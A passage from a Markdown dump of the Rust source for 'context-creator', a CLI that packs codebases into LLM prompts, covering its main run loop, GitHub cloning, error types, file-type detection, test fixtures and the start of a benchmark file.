            max_tokens: None,
            llm_tool: crate::cli::LlmTool::Gemini,
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        let options = WalkOptions::from_config(&config).unwrap();
        assert!(!options.filter_binary_files);
    }
}
```

## src/lib.rs

Imports: cli, config, core, remote, utils, anyhow::Result, std::path::Path, std::sync::Arc, pub use cli::Config, pub use core, pub use utils::error::ContextCreatorError, std::io::Write, std, arboard::Clipboard, config

Type references: std::path::Path.Path, pub use cli::Config.Config, pub use utils::error::ContextCreatorError.ContextCreatorError, pub use cli::Config.Config, pub use cli::Config.Config, std::path::Path.Path, std::path::Path.Path, WalkOptions, WalkOptions, ContextOptions, ContextOptions, FileCache, pub use cli::Config.Config, pub use cli::Config.Config, pub use cli::Config.Config, pub use cli::Config.Config, std::io::Write.Write, ContextCreatorError.LlmToolNotFound, LlmToolNotFound, arboard::Clipboard.Clipboard

```rust
//! Context Creator - High-performance CLI tool to convert codebases to Markdown for LLM context
//!
//! This library provides the core functionality for traversing directories,
//! processing files, and generating formatted Markdown output suitable for
//! large language model consumption.

pub mod cli;
pub mod config;
pub mod core;
pub mod remote;
pub mod utils;

use anyhow::Result;
use std::path::Path;
use std::sync::Arc;

pub use cli::Config;
pub use core::{cache::FileCache, context_builder::ContextOptions, walker::WalkOptions};
pub use utils::error::ContextCreatorError;

/// Main entry point for the context creator library
pub fn run(mut config: Config) -> Result<()> {
    // Load configuration from file first
    config.load_from_file()?;

    // Validate configuration BEFORE processing
    // This ensures mutual exclusivity checks work correctly
    config.validate()?;

    // Handle remote repository if specified
    let _temp_dir = if let Some(repo_url) = &config.repo {
        if config.verbose {
            eprintln!("ðŸ”§ Starting context-creator with remote repository: {repo_url}");
        }

        // Fetch the repository
        let temp_dir = crate::remote::fetch_repository(repo_url, config.verbose)?;
        let repo_path = crate::remote::get_repo_path(&temp_dir, repo_url)?;

        // Update config to use the cloned repository
        config.paths = Some(vec![repo_path]);

        Some(temp_dir) // Keep temp_dir alive until end of function
    } else {
        None
    };

    // No need to update config since get_directories() handles resolution

    // Setup logging based on verbosity
    if config.verbose {
        eprintln!("ðŸ”§ Starting context-creator with configuration:");
        eprintln!("  Directories: {:?}", config.get_directories());
        eprintln!("  Max tokens: {:?}", config.max_tokens);
        eprintln!("  LLM tool: {}", config.llm_tool.command());
        eprintln!("  Progress: {}", config.progress);
        eprintln!("  Quiet: {}", config.quiet);
        if let Some(output) = &config.output_file {
            eprintln!("  Output file: {}", output.display());
        }
        if let Some(prompt) = config.get_prompt() {
            eprintln!("  Prompt: {prompt}");
        }
    }

    // Configuration was already validated above

    // Create walker with options
    if config.verbose {
        eprintln!("ðŸš¶ Creating directory walker with options...");
    }
    let walk_options = WalkOptions::from_config(&config)?;

    // Create context options
    if config.verbose {
        eprintln!("ðŸ“„ Creating context generation options...");
    }
    let context_options = ContextOptions::from_config(&config)?;

    // Create shared file cache
    if config.verbose {
        eprintln!("ðŸ’¾ Creating file cache for I/O optimization...");
    }
    let cache = Arc::new(FileCache::new());

    // Process all directories
    let mut all_outputs = Vec::new();

    let directories = config.get_directories();
    for (index, directory) in directories.iter().enumerate() {
        if config.progress && !config.quiet && directories.len() > 1 {
            eprintln!(
                "ðŸ“‚ Processing directory {} of {}: {}",
                index + 1,
                directories.len(),
                directory.display()
            );
        }

        let output = process_directory(
            directory,
            walk_options.clone(),
            context_options.clone(),
            cache.clone(),
            &config,
        )?;
        all_outputs.push((directory.clone(), output));
    }

    // Combine outputs from all directories
    let output = if all_outputs.len() == 1 {
        // Single directory - return output as-is
        all_outputs.into_iter().next().unwrap().1
    } else {
        // Multiple directories - combine with headers
        let mut combined = String::new();
        combined.push_str("# Code Context - Multiple Directories\n\n");

        for (path, content) in all_outputs {
            combined.push_str(&format!("## Directory: {}\n\n", path.display()));
            combined.push_str(&content);
            combined.push_str("\n\n");
        }

        combined
    };

    // Handle output based on configuration
    let resolved_prompt = config.get_prompt();
    match (
        config.output_file.as_ref(),
        resolved_prompt.as_ref(),
        config.copy,
    ) {
        (Some(file), None, false) => {
            // Write to file
            std::fs::write(file, output)?;
            if !config.quiet {
                println!(" Written to {}", file.display());
            }
        }
        (None, Some(prompt), false) => {
            // Send to LLM CLI with prompt
            if config.progress && !config.quiet {
                eprintln!("ðŸ¤– Sending context to {}...", config.llm_tool.command());
            }
            execute_with_llm(prompt, &output, &config)?;
        }
        (None, Some(prompt), true) => {
            // Copy to clipboard then send to LLM
            copy_to_clipboard(&output)?;
            if !config.quiet {
                println!("âœ“ Copied to clipboard");
            }
            if config.progress && !config.quiet {
                eprintln!("ðŸ¤– Sending context to {}...", config.llm_tool.command());
            }
            execute_with_llm(prompt, &output, &config)?;
        }
        (None, None, true) => {
            // Copy to clipboard
            copy_to_clipboard(&output)?;
            if !config.quiet {
                println!("âœ“ Copied to clipboard");
            }
        }
        (None, None, false) => {
            // Print to stdout
            print!("{output}");
        }
        (Some(_), _, true) => {
            // This should have been caught by validation
            return Err(ContextCreatorError::InvalidConfiguration(
                "Cannot specify both --copy and --output".to_string(),
            )
            .into());
        }
        (Some(_), Some(_), _) => {
            return Err(ContextCreatorError::InvalidConfiguration(
                "Cannot specify both output file and prompt".to_string(),
            )
            .into());
        }
    }

    Ok(())
}

/// Process a directory and generate markdown output
fn process_directory(
    path: &Path,
    walk_options: WalkOptions,
    context_options: ContextOptions,
    cache: Arc<FileCache>,
    config: &Config,
) -> Result<String> {
    // Walk the directory
    if config.progress && !config.quiet {
        eprintln!("ðŸ” Scanning directory: {}", path.display());
    }
    let mut files = core::walker::walk_directory(path, walk_options)?;

    if config.progress && !config.quiet {
        eprintln!("ðŸ“ Found {} files", files.len());
    }

    // Perform semantic analysis if requested
    if config.trace_imports || config.include_callers || config.include_types {
        if config.progress && !config.quiet {
            eprintln!("ðŸ”— Analyzing semantic dependencies...");
        }
        core::walker::perform_semantic_analysis(&mut files, config, &cache)?;

        if config.progress && !config.quiet {
            let import_count: usize = files.iter().map(|f| f.imports.len()).sum();
            eprintln!("âœ… Found {import_count} import relationships");
        }

        // Expand file list based on semantic relationships
        if config.progress && !config.quiet {
            eprintln!("ðŸ“‚ Expanding file list based on semantic relationships...");
        }

        // Convert Vec<FileInfo> to HashMap for expansion
        let mut files_map = std::collections::HashMap::new();
        for file in files {
            files_map.insert(file.path.clone(), file);
        }

        // Expand the file list
        files_map = core::file_expander::expand_file_list(files_map, config, &cache)?;

        // Convert back to Vec<FileInfo>
        files = files_map.into_values().collect();

        if config.progress && !config.quiet {
            eprintln!("ðŸ“Š Expanded to {} files", files.len());
        }
    }

    if config.verbose {
        eprintln!("ðŸ“‹ File list:");
        for file in &files {
            eprintln!(
                "  {} ({})",
                file.relative_path.display(),
                file.file_type_display()
            );
        }
    }

    // Prioritize files if needed
    let prioritized_files = if context_options.max_tokens.is_some() {
        if config.progress && !config.quiet {
            eprintln!("ðŸŽ¯ Prioritizing files for token limit...");
        }
        core::prioritizer::prioritize_files(files, &context_options, cache.clone())?
    } else {
        files
    };

    if config.progress && !config.quiet {
        eprintln!(
            "ðŸ“ Generating markdown from {} files...",
            prioritized_files.len()
        );
    }

    // Generate markdown
    let markdown =
        core::context_builder::generate_markdown(prioritized_files, context_options, cache)?;

    if config.progress && !config.quiet {
        eprintln!("âœ… Markdown generation complete");
    }

    Ok(markdown)
}

/// Execute LLM CLI with the generated context
fn execute_with_llm(prompt: &str, context: &str, config: &Config) -> Result<()> {
    use std::io::Write;
    use std::process::{Command, Stdio};

    let full_input = format!("{prompt}\n\n{context}");
    let tool_command = config.llm_tool.command();

    let mut child = Command::new(tool_command)
        .stdin(Stdio::piped())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .spawn()
        .map_err(|e| {
            if e.kind() == std::io::ErrorKind::NotFound {
                ContextCreatorError::LlmToolNotFound {
                    tool: tool_command.to_string(),
                    install_instructions: config.llm_tool.install_instructions().to_string(),
                }
            } else {
                ContextCreatorError::SubprocessError(e.to_string())
            }
        })?;

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(full_input.as_bytes())?;
        stdin.flush()?;
    }

    let status = child.wait()?;
    if !status.success() {
        return Err(ContextCreatorError::SubprocessError(format!(
            "{tool_command} exited with status: {status}"
        ))
        .into());
    }

    if !config.quiet {
        eprintln!("\nâœ“ {tool_command} completed successfully");
    }

    Ok(())
}

/// Copy content to system clipboard
fn copy_to_clipboard(content: &str) -> Result<()> {
    use arboard::Clipboard;

    let mut clipboard = Clipboard::new().map_err(|e| {
        ContextCreatorError::ClipboardError(format!("Failed to access clipboard: {e}"))
    })?;

    clipboard.set_text(content).map_err(|e| {
        ContextCreatorError::ClipboardError(format!("Failed to copy to clipboard: {e}"))
    })?;

    Ok(())
}
```

## src/remote.rs

Imports: crate::utils::error::ContextCreatorError, std::path::PathBuf, std::process::Command, tempfile::TempDir, std::fs, std::os::unix::fs::PermissionsExt, tests, super::*

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, std::path::PathBuf.PathBuf, std::process::Command.Command, tempfile::TempDir.TempDir, fs, crate::utils::error::ContextCreatorError.ContextCreatorError, tempfile::TempDir.TempDir, crate::utils::error::ContextCreatorError.ContextCreatorError, std::os::unix::fs::PermissionsExt.PermissionsExt, Path, crate::utils::error::ContextCreatorError.ContextCreatorError, Path, crate::utils::error::ContextCreatorError.ContextCreatorError, tempfile::TempDir.TempDir, tempfile::TempDir.TempDir, std::path::PathBuf.PathBuf, crate::utils::error::ContextCreatorError.ContextCreatorError, fs

```rust
//! Remote repository fetching functionality

use crate::utils::error::ContextCreatorError;
use std::path::PathBuf;
use std::process::Command;
use tempfile::TempDir;

#[cfg(unix)]
use std::fs;

/// Check if gh CLI is available
pub fn gh_available() -> bool {
    Command::new("gh")
        .arg("--version")
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

/// Check if git is available
pub fn git_available() -> bool {
    Command::new("git")
        .arg("--version")
        .output()
        .map(|output| output.status.success())
        .unwrap_or(false)
}

/// Parse GitHub URL to extract owner and repo
pub fn parse_github_url(url: &str) -> Result<(String, String), ContextCreatorError> {
    let url = url.trim_end_matches('/');

    // Handle both https:// and http:// URLs
    let parts: Vec<&str> = if url.starts_with("https://github.com/") {
        url.strip_prefix("https://github.com/")
            .ok_or_else(|| {
                ContextCreatorError::InvalidConfiguration("Invalid GitHub URL".to_string())
            })?
            .split('/')
            .collect()
    } else if url.starts_with("http://github.com/") {
        url.strip_prefix("http://github.com/")
            .ok_or_else(|| {
                ContextCreatorError::InvalidConfiguration("Invalid GitHub URL".to_string())
            })?
            .split('/')
            .collect()
    } else {
        return Err(ContextCreatorError::InvalidConfiguration(
            "URL must start with https://github.com/ or http://github.com/".to_string(),
        ));
    };

    if parts.len() < 2 {
        return Err(ContextCreatorError::InvalidConfiguration(
            "GitHub URL must contain owner and repository name".to_string(),
        ));
    }

    Ok((parts[0].to_string(), parts[1].to_string()))
}

/// Fetch a repository from GitHub
pub fn fetch_repository(repo_url: &str, verbose: bool) -> Result<TempDir, ContextCreatorError> {
    let (owner, repo) = parse_github_url(repo_url)?;
    let temp_dir = TempDir::new().map_err(|e| {
        ContextCreatorError::RemoteFetchError(format!("Failed to create temp directory: {e}"))
    })?;

    // Set secure permissions on temp directory (0700)
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let metadata = fs::metadata(temp_dir.path()).map_err(|e| {
            ContextCreatorError::RemoteFetchError(format!(
                "Failed to get temp directory metadata: {e}"
            ))
        })?;
        let mut perms = metadata.permissions();
        perms.set_mode(0o700);
        fs::set_permissions(temp_dir.path(), perms).map_err(|e| {
            ContextCreatorError::RemoteFetchError(format!(
                "Failed to set temp directory permissions: {e}"
            ))
        })?;
    }

    if verbose {
        eprintln!("ðŸ“¥ Fetching repository: {owner}/{repo}");
    }

    // Try gh first, then fall back to git
    let success = if gh_available() {
        if verbose {
            eprintln!("ðŸ”§ Using gh CLI for optimal performance");
        }
        clone_with_gh(&owner, &repo, temp_dir.path(), verbose)?
    } else if git_available() {
        if verbose {
            eprintln!("ðŸ”§ Using git clone (gh CLI not available)");
        }
        clone_with_git(repo_url, temp_dir.path(), verbose)?
    } else {
        return Err(ContextCreatorError::RemoteFetchError(
            "Neither gh CLI nor git is available. Please install one of them.".to_string(),
        ));
    };

    if !success {
        return Err(ContextCreatorError::RemoteFetchError(
            "Failed to clone repository".to_string(),
        ));
    }

    if verbose {
        eprintln!("âœ… Repository fetched successfully");
    }

    Ok(temp_dir)
}

/// Clone repository using gh CLI
fn clone_with_gh(
    owner: &str,
    repo: &str,
    target_dir: &std::path::Path,
    verbose: bool,
) -> Result<bool, ContextCreatorError> {
    let repo_spec = format!("{owner}/{repo}");
    let mut cmd = Command::new("gh");
    cmd.arg("repo")
        .arg("clone")
        .arg(&repo_spec)
        .arg(target_dir.join(repo))
        .arg("--")
        .arg("--depth")
        .arg("1");

    if verbose {
        eprintln!("ðŸ”„ Running: gh repo clone {repo_spec} --depth 1");
    }

    let output = cmd
        .output()
        .map_err(|e| ContextCreatorError::RemoteFetchError(format!("Failed to run gh: {e}")))?;

    Ok(output.status.success())
}

/// Clone repository using git
fn clone_with_git(
    repo_url: &str,
    target_dir: &std::path::Path,
    verbose: bool,
) -> Result<bool, ContextCreatorError> {
    let repo_name = repo_url.split('/').next_back().ok_or_else(|| {
        ContextCreatorError::InvalidConfiguration("Invalid repository URL".to_string())
    })?;

    let mut cmd = Command::new("git");
    cmd.arg("clone")
        .arg("--depth")
        .arg("1")
        .arg(repo_url)
        .arg(target_dir.join(repo_name));

    if verbose {
        eprintln!("ðŸ”„ Running: git clone --depth 1 {repo_url}");
    }

    let output = cmd
        .output()
        .map_err(|e| ContextCreatorError::RemoteFetchError(format!("Failed to run git: {e}")))?;

    Ok(output.status.success())
}

/// Get the path to the cloned repository within the temp directory
pub fn get_repo_path(temp_dir: &TempDir, repo_url: &str) -> Result<PathBuf, ContextCreatorError> {
    let (_, repo) = parse_github_url(repo_url)?;
    let repo_path = temp_dir.path().join(&repo);

    if !repo_path.exists() {
        return Err(ContextCreatorError::RemoteFetchError(format!(
            "Repository directory not found after cloning: {}",
            repo_path.display()
        )));
    }

    Ok(repo_path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_github_url_https() {
        let (owner, repo) = parse_github_url("https://github.com/rust-lang/rust").unwrap();
        assert_eq!(owner, "rust-lang");
        assert_eq!(repo, "rust");
    }

    #[test]
    fn test_parse_github_url_http() {
        let (owner, repo) = parse_github_url("http://github.com/rust-lang/rust").unwrap();
        assert_eq!(owner, "rust-lang");
        assert_eq!(repo, "rust");
    }

    #[test]
    fn test_parse_github_url_trailing_slash() {
        let (owner, repo) = parse_github_url("https://github.com/rust-lang/rust/").unwrap();
        assert_eq!(owner, "rust-lang");
        assert_eq!(repo, "rust");
    }

    #[test]
    fn test_parse_github_url_invalid() {
        assert!(parse_github_url("https://gitlab.com/rust-lang/rust").is_err());
        assert!(parse_github_url("not-a-url").is_err());
        assert!(parse_github_url("https://github.com/").is_err());
        assert!(parse_github_url("https://github.com/rust-lang").is_err());
    }

    #[test]
    fn test_gh_available() {
        // This test will pass or fail depending on the environment
        // We just ensure it doesn't panic
        let _ = gh_available();
    }

    #[test]
    fn test_git_available() {
        // This test will pass or fail depending on the environment
        // We just ensure it doesn't panic
        let _ = git_available();
    }

    #[test]
    fn test_get_repo_path() {
        use std::fs;

        let temp_dir = TempDir::new().unwrap();
        let repo_url = "https://github.com/owner/repo";

        // Create the expected directory
        fs::create_dir_all(temp_dir.path().join("repo")).unwrap();

        let path = get_repo_path(&temp_dir, repo_url).unwrap();
        assert_eq!(path, temp_dir.path().join("repo"));
    }

    #[test]
    fn test_get_repo_path_not_found() {
        let temp_dir = TempDir::new().unwrap();
        let repo_url = "https://github.com/owner/repo";

        // Don't create the directory
        let result = get_repo_path(&temp_dir, repo_url);
        assert!(result.is_err());
    }
}
```

## src/utils/error.rs

Imports: thiserror::Error, tests, super::*

Imported by: main.rs, parser_pool.rs

Type references: thiserror::Error.Error, ContextCreatorError, thiserror::Error.Error, FromUtf8Error, T, T, ContextCreatorError, ContextCreatorError.TokenLimitExceeded, TokenLimitExceeded, ContextCreatorError

```rust
//! Error types for context-creator

use thiserror::Error;

/// Main error type for context-creator operations
#[derive(Error, Debug)]
pub enum ContextCreatorError {
    /// File system related errors
    #[error("Invalid path: {0}")]
    InvalidPath(String),

    #[error("Failed to read file: {0}")]
    ReadError(String),

    #[error("Failed to write file: {0}")]
    WriteError(String),

    /// Configuration errors
    #[error("Invalid configuration: {0}")]
    InvalidConfiguration(String),

    #[error("Failed to parse configuration: {0}")]
    ConfigParseError(String),

    #[error("Configuration file error: {0}")]
    ConfigError(String),

    /// Processing errors
    #[error("Token counting error: {0}")]
    TokenCountError(String),

    #[error("Context generation error: {0}")]
    ContextGenerationError(String),

    #[error("File prioritization error: {0}")]
    PrioritizationError(String),

    /// External tool errors
    #[error("{tool} not found. {install_instructions}")]
    LlmToolNotFound {
        tool: String,
        install_instructions: String,
    },

    #[error("Subprocess error: {0}")]
    SubprocessError(String),

    /// Resource limits
    #[error("File too large: {0} (max: {1} bytes)")]
    FileTooLarge(String, usize),

    #[error("Token limit exceeded: {current} tokens (max: {max})")]
    TokenLimitExceeded { current: usize, max: usize },

    /// Parsing errors
    #[error("Parse error: {0}")]
    ParseError(String),

    /// Pattern matching errors
    #[error("Invalid glob pattern: {0}")]
    InvalidGlobPattern(String),

    /// Mutex errors
    #[error("Mutex was poisoned, indicating a previous panic")]
    MutexPoisoned,

    /// Security errors
    #[error("Security error: {0}")]
    SecurityError(String),

    /// Remote repository errors
    #[error("Remote fetch error: {0}")]
    RemoteFetchError(String),

    /// Clipboard errors
    #[error("Clipboard error: {0}")]
    ClipboardError(String),

    /// Parallel processing errors
    #[error("File processing error for {path}: {error}")]
    FileProcessingError { path: String, error: String },

    #[error("Token counting error for {path}: {error}")]
    TokenCountingError { path: String, error: String },

    #[error("Parallel processing errors: {error_count} files failed")]
    ParallelProcessingErrors { error_count: usize },

    /// General I/O errors
    #[error("I/O error: {0}")]
    IoError(#[from] std::io::Error),

    /// UTF-8 conversion errors
    #[error("UTF-8 conversion error: {0}")]
    Utf8Error(#[from] std::string::FromUtf8Error),
}

/// Result type alias for context-creator operations
pub type Result<T> = std::result::Result<T, ContextCreatorError>;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_error_display() {
        let err = ContextCreatorError::InvalidPath("/invalid/path".to_string());
        assert_eq!(err.to_string(), "Invalid path: /invalid/path");

        let err = ContextCreatorError::TokenLimitExceeded {
            current: 200000,
            max: 150000,
        };
        assert_eq!(
            err.to_string(),
            "Token limit exceeded: 200000 tokens (max: 150000)"
        );
    }

    #[test]
    fn test_io_error_conversion() {
        let io_err = std::io::Error::new(std::io::ErrorKind::NotFound, "file not found");
        let err: ContextCreatorError = io_err.into();
        assert!(matches!(err, ContextCreatorError::IoError(_)));
    }
}
```

## src/utils/file_ext.rs

Imports: std::path::Path, tests, super::*

Type references: std::path::Path.Path, FileType, FileType, std::path::Path.Path, std::path::Path.Path, Self, Self, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path

```rust
//! File extension to language mapping utilities

use std::path::Path;

/// File type enumeration for categorizing files
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum FileType {
    // Programming languages
    Rust,
    Python,
    JavaScript,
    TypeScript,
    Go,
    Java,
    Cpp,
    C,
    CSharp,
    Ruby,
    Php,
    Swift,
    Kotlin,
    Scala,
    Haskell,
    Dart,
    Lua,
    R,
    Julia,
    Elixir,
    Elm,

    // Data formats
    Markdown,
    Json,
    Yaml,
    Toml,
    Xml,
    Html,
    Css,

    // Other
    Text,
    Other,
}

impl FileType {
    /// Determine file type from path
    pub fn from_path(path: &Path) -> Self {
        let extension = path
            .extension()
            .and_then(|ext| ext.to_str())
            .unwrap_or("")
            .to_lowercase();

        match extension.as_str() {
            "rs" => FileType::Rust,
            "py" => FileType::Python,
            "js" | "mjs" | "cjs" => FileType::JavaScript,
            "ts" | "tsx" => FileType::TypeScript,
            "go" => FileType::Go,
            "java" => FileType::Java,
            "cpp" | "cc" | "cxx" | "c++" | "hpp" | "hxx" | "h++" => FileType::Cpp,
            "c" | "h" => FileType::C,
            "cs" => FileType::CSharp,
            "rb" => FileType::Ruby,
            "php" => FileType::Php,
            "swift" => FileType::Swift,
            "kt" | "kts" => FileType::Kotlin,
            "scala" | "sc" => FileType::Scala,
            "hs" => FileType::Haskell,
            "dart" => FileType::Dart,
            "lua" => FileType::Lua,
            "r" => FileType::R,
            "jl" => FileType::Julia,
            "ex" | "exs" => FileType::Elixir,
            "elm" => FileType::Elm,
            "md" | "markdown" => FileType::Markdown,
            "json" => FileType::Json,
            "yaml" | "yml" => FileType::Yaml,
            "toml" => FileType::Toml,
            "xml" => FileType::Xml,
            "html" | "htm" => FileType::Html,
            "css" | "scss" | "sass" | "less" => FileType::Css,
            "txt" | "text" => FileType::Text,
            _ => {
                // Check if it's a text file by name
                let filename = path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .unwrap_or("");

                match filename {
                    "README" | "LICENSE" | "CHANGELOG" | "AUTHORS" | "CONTRIBUTORS" => {
                        FileType::Text
                    }
                    "Makefile" | "Dockerfile" | "Vagrantfile" | "Jenkinsfile" => FileType::Text,
                    _ if !is_binary_extension(path) => FileType::Text,
                    _ => FileType::Other,
                }
            }
        }
    }
}

/// Get the markdown code fence language for a file extension
pub fn get_language_from_extension(path: &Path) -> &'static str {
    let extension = path.extension().and_then(|ext| ext.to_str()).unwrap_or("");

    match extension.to_lowercase().as_str() {
        // Programming languages
        "rs" => "rust",
        "py" => "python",
        "js" | "mjs" | "cjs" => "javascript",
        "ts" | "tsx" => "typescript",
        "jsx" => "jsx",
        "go" => "go",
        "c" => "c",
        "cpp" | "cc" | "cxx" | "c++" => "cpp",
        "h" | "hpp" | "hxx" => "cpp",
        "cs" => "csharp",
        "java" => "java",
        "kt" | "kts" => "kotlin",
        "swift" => "swift",
        "rb" => "ruby",
        "php" => "php",
        "lua" => "lua",
        "r" => "r",
        "scala" => "scala",
        "clj" | "cljs" => "clojure",
        "ex" | "exs" => "elixir",
        "elm" => "elm",
        "hs" => "haskell",
        "ml" | "mli" => "ocaml",
        "fs" | "fsx" => "fsharp",
        "pl" => "perl",
        "sh" => "bash",
        "fish" => "fish",
        "zsh" => "zsh",
        "ps1" => "powershell",
        "dart" => "dart",
        "julia" | "jl" => "julia",
        "nim" => "nim",
        "zig" => "zig",
        "v" => "v",
        "d" => "d",

        // Web technologies
        "html" | "htm" => "html",
        "css" => "css",
        "scss" | "sass" => "scss",
        "less" => "less",
        "vue" => "vue",
        "svelte" => "svelte",

        // Data formats
        "json" => "json",
        "yaml" | "yml" => "yaml",
        "toml" => "toml",
        "xml" => "xml",
        "csv" => "csv",
        "sql" => "sql",

        // Markup languages
        "md" | "markdown" => "markdown",
        "tex" => "latex",
        "rst" => "rst",
        "adoc" | "asciidoc" => "asciidoc",

        // Configuration files
        "ini" | "cfg" => "ini",
        "conf" | "config" => "text",
        "env" => "dotenv",
        "dockerfile" => "dockerfile",
        "makefile" | "mk" => "makefile",

        // Shell scripts
        "bash" => "bash",
        "bat" | "cmd" => "batch",

        // Other
        "proto" => "protobuf",
        "graphql" | "gql" => "graphql",
        "tf" => "hcl",
        "vim" => "vim",
        "diff" | "patch" => "diff",

        // Default to text for unknown extensions
        _ => "text",
    }
}

/// Check if a file is likely to be binary based on its extension
pub fn is_binary_extension(path: &Path) -> bool {
    let extension = path.extension().and_then(|ext| ext.to_str()).unwrap_or("");

    matches!(
        extension.to_lowercase().as_str(),
        // Executables and libraries
        "exe" | "dll" | "so" | "dylib" | "a" | "lib" | "bin" |
        // Archives
        "zip" | "tar" | "gz" | "bz2" | "xz" | "7z" | "rar" |
        // Images
        "jpg" | "jpeg" | "png" | "gif" | "bmp" | "ico" | "svg" | "webp" |
        // Audio
        "mp3" | "wav" | "flac" | "aac" | "ogg" | "wma" |
        // Video
        "mp4" | "avi" | "mkv" | "mov" | "wmv" | "flv" | "webm" |
        // Documents
        "pdf" | "doc" | "docx" | "xls" | "xlsx" | "ppt" | "pptx" |
        // Fonts
        "ttf" | "otf" | "woff" | "woff2" | "eot" |
        // Database
        "db" | "sqlite" | "sqlite3" |
        // Other binary formats
        "pyc" | "pyo" | "class" | "o" | "obj" | "pdb"
    )
}

/// Detect if content contains binary data (null bytes)
pub fn is_binary_content(content: &[u8]) -> bool {
    // Check first 8KB for null bytes
    let check_len = content.len().min(8192);
    content[..check_len].contains(&0)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn test_language_detection() {
        assert_eq!(get_language_from_extension(Path::new("test.rs")), "rust");
        assert_eq!(get_language_from_extension(Path::new("test.py")), "python");
        assert_eq!(
            get_language_from_extension(Path::new("test.js")),
            "javascript"
        );
        assert_eq!(
            get_language_from_extension(Path::new("test.unknown")),
            "text"
        );
        assert_eq!(get_language_from_extension(Path::new("Makefile")), "text");
    }

    #[test]
    fn test_binary_extension_detection() {
        assert!(is_binary_extension(Path::new("test.exe")));
        assert!(is_binary_extension(Path::new("image.png")));
        assert!(is_binary_extension(Path::new("archive.zip")));
        assert!(!is_binary_extension(Path::new("code.rs")));
        assert!(!is_binary_extension(Path::new("text.md")));
    }

    #[test]
    fn test_binary_content_detection() {
        assert!(!is_binary_content(b"Hello, world!"));
        assert!(is_binary_content(b"Hello\0world"));
        assert!(is_binary_content(&[0xFF, 0xFE, 0x00, 0x00]));
    }
}
```

## src/utils/mod.rs

Imports: error, file_ext

```rust
//! Utility modules

pub mod error;
pub mod file_ext;
```

## test_no_git/main.rs

Imports: std::collections::HashMap

```rust
use std::collections::HashMap;
```

## test_no_git/test_no_git_dir/main.rs

Imports: std::collections::HashMap, models, models::User, user, user

Type references: models::User.User, models::User.User

```rust
use std::collections::HashMap;

mod models;
use models::User;

fn main() {
    let user = User { name: "test".to_string(), age: 30 };
    println!("{}", user.name);
}
```

## test_semantic/main.rs

Imports: utils, utils::helper

Type references: helper

```rust
mod utils;
use utils::helper;

fn main() {
    let result = helper::process("data");
    println!("Result: {}", result);
}
```

## examples/sample-mixed-project/src/index.js

Imports: express, axios, dotenv

```javascript
/**
 * Sample Express.js application
 * This demonstrates a mixed-language project structure
 */

const express = require('express');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Welcome to Sample Mixed Project',
        version: '1.0.0',
        timestamp: new Date().toISOString()
    });
});

app.get('/api/users', async (req, res) => {
    try {
        // Simulated user data
        const users = [
            { id: 1, name: 'Alice', role: 'admin' },
            { id: 2, name: 'Bob', role: 'user' },
            { id: 3, name: 'Charlie', role: 'user' }
        ];
        
        res.json({ users, count: users.length });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
```

## benches/benchmarks.rs

Imports: criterion, std::fs, std::path::Path, tempfile::TempDir, context_creator, context_creator::utils::file_ext::FileType, std::sync::Arc, rayon::prelude::*

Type references: fs, std::path::Path.Path, tempfile::TempDir.TempDir, context_creator::utils::file_ext::FileType.FileType, std::path::Path.Path, std::path::Path.Path, PathBuf, criterion.Criterion, criterion.Criterion, criterion.Criterion, criterion.Criterion, criterion.Criterion, criterion.Criterion, context_creator.ContextOptions, criterion.Criterion, criterion.Criterion, context_creator.ContextOptions, criterion.Criterion, criterion.Criterion, context_creator.ContextOptions, criterion.Criterion, criterion.Criterion, criterion.Criterion, criterion.Criterion, _, criterion.Criterion, criterion.Criterion

```rust
//! Performance benchmarks for context-creator
//!
//! This benchmark suite measures the performance of key components:
//! - Directory walking and file discovery
//! - File prioritization and token counting
//! - Markdown generation
//! - End-to-end processing performance

use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
use std::fs;
use std::path::Path;
use tempfile::TempDir;

use context_creator::core::{
    cache::FileCache,
    context_builder::{generate_markdown, ContextOptions},
    prioritizer::prioritize_files,
    token::TokenCounter,
    walker::{walk_directory, WalkOptions},
};
use context_creator::utils::file_ext::FileType;
use std::sync::Arc;

/// Create a test project with various file sizes and types
fn create_test_project(
    temp_dir: &Path,
    file_count: usize,
    avg_file_size: usize,
) -> std::path::PathBuf {
    let project_dir = temp_dir.join("benchmark_project");
    fs::create_dir_all(&project_dir).unwrap();

    // Create nested directory structure
    fs::create_dir_all(project_dir.join("src/core")).unwrap();
    fs::create_dir_all(project_dir.join("src/utils")).unwrap();
    fs::create_dir_all(project_dir.join("tests")).unwrap();
    fs::create_dir_all(project_dir.join("benches")).unwrap();
    fs::create_dir_all(project_dir.join("examples")).unwrap();

    // Create various file types with different sizes
    let file_templates = [
        ("src/main.rs", "rust", "fn main() {\n    println!(\"Hello, world!\");\n}\n"),
        ("src/lib.rs", "rust", "//! Library module\n\npub mod core;\npub mod utils;\n"),
        ("src/core/mod.rs", "rust", "//! Core functionality\n\npub mod processor;\npub mod walker;\n"),
        ("src/utils/helpers.rs", "rust", "//! Utility functions\n\npub fn helper() -> String {\n    \"helper\".to_string()\n}\n"),
